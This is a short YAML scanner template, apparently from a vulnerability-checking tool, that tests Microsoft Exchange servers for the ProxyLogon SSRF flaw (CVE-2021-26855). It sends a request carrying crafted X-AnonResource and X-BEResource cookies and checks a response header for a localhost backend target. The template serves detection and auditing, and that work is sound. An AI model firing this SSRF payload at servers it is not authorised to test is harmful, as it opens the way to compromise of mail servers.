id: exchange-cve-2021-26855-ssrf

info:
    name: exchange-cve-2021-26855-ssrf
    author: sharecast
    severity: high

manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /owa/auth/x.js
            headers:
                Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
            follow_redirects: false
        expression: response.headers["X-CalculatedBETarget"].icontains("localhost")
expression: r0()
